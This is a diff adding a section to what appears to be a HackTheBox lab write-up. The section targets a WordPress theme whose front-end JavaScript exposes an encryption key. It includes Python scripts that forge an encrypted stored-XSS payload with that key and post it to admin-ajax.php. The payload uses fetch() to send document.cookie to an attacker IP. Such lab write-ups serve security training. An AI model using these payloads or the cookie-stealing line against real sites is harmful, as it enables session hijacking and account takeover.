@@ -162,3 +162,127 @@ feroxbuster -u https://makesense.htb/wp-content/themes/webagency/ -k -x onnx,jso
 {% endcode %}
 
 <figure><img src=".gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>
+
+[https://makesense.htb/wp-content/themes/webagency/assets/js/main.js](https://makesense.htb/wp-content/themes/webagency/assets/js/main.js)
+
+on the  [https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js](https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js)
+
+i found the key that encrypt data&#x20;
+
+{% code overflow="wrap" %}
+```javascript
+// Symmetric encryption key (must match server-side)
+const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';
+
+// Encrypt payload using AES-GCM
+```
+{% endcode %}
+
+**Voice-to-Symbol Mapping (XSS Injection Vector)**
+
+{% code overflow="wrap" %}
+```javascript
+applySymbolMapping(text) {
+    // ...
+    const mappings = {
+        'open bracket': '<',
+        'close bracket': '>',
+        'bracket': '<', // Default single 'bracket' to opening
+        'slash': '/',
+        'back slash': '\\',
+        'quote': "'",
+        'double quote': '"',
+        'open parenthesis': '(',
+        'close parenthesis': ')',
+        // ...
+    };
+    // ...
+    // Clean up spaces around symbols
+    result = result.replace(/\s*([<>\/()[\]{}.,:;=\-_+*&%$#!?])\s*/g, '$1');
+    return result;
+}
+```
+{% endcode %}
+
+**Client-Side Trust & Lack of Output Encoding**
+
+{% code overflow="wrap" %}
+```javascript
+// Combine IV + ciphertext (tag is appended automatically by WebCrypto)
+const combined = new Uint8Array(iv.length + encrypted.byteLength);
+combined.set(iv, 0);
+combined.set(new Uint8Array(encrypted), iv.length);
+// ...
+return btoa(binary);
+```
+{% endcode %}
+
+**The system relies on the frontend to encrypt the data, assuming that the server will decrypt it and trust its contents.**&#x48;**owever, because the key is public (Vulnerability #1), an attacker can forge any payload. If the server decrypts this data and renders it in the admin dashboard or frontend without proper HTML entity encoding (e.g., using `innerHTML` instead of `textContent`), the injected `<script>` tags will execute, leading to Stored XSS.**
+
+**i start by encoding my payload using a script**
+
+{% code overflow="wrap" %}
+```python
+import hashlib
+import os
+import base64
+import json
+from Crypto.Cipher import AES
+
+# 1. Extracted from frontend code
+ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI'
+
+# 2. The XSS payload (simulating the final output of applySymbolMapping)
+# You can change this to any payload you want (e.g., stealing cookies, redirecting, etc.)
+xss_payload = "<script>fetch('http://10.10.14.63:1234/?c='+document.cookie)</script>"
+
+payload_data = {
+    "transcription": xss_payload,
+    "summary": xss_payload
+}
+
+# 3. Derive key using SHA-256 (matching WebCrypto API: crypto.subtle.digest('SHA-256', ...))
+key_material = hashlib.sha256(ENCRYPTION_KEY.encode('utf-8')).digest()
+
+# 4. Generate random IV (12 bytes for AES-GCM)
+iv = os.urandom(12)
+
+# 5. Encrypt using AES-GCM
+cipher = AES.new(key_material, AES.MODE_GCM, nonce=iv)
+ciphertext, tag = cipher.encrypt_and_digest(json.dumps(payload_data).encode('utf-8'))
+
+# 6. Combine IV + ciphertext + tag (matching frontend logic)
+combined = iv + ciphertext + tag
+
+# 7. Base64 encode (matching frontend logic: btoa(binary))
+encrypted_payload = base64.b64encode(combined).decode('utf-8')
+
+print("[+] Successfully generated encrypted payload:\n")
+print(encrypted_payload)
+```
+{% endcode %}
+
+**exploit.py**
+
+{% code overflow="wrap" %}
+```python
+import requests
+
+url = "https://makesense.htb/wp-admin/admin-ajax.php"
+
+# Replace these with values from a legitimate request you captured
+VALID_NONCE = "f3142630f4"
+VALID_POST_ID = "103"
+
+data = {
+    'action': 'save_voice_results',
+    'nonce': VALID_NONCE,
+    'post_id': VALID_POST_ID,
+    'encrypted_payload': '<ENC>' # The output from the previous script
+}
+
+response = requests.post(url, data=data, verify=False)
+print(response.status_code)
+print(response.text)
+```
+{% endcode %}
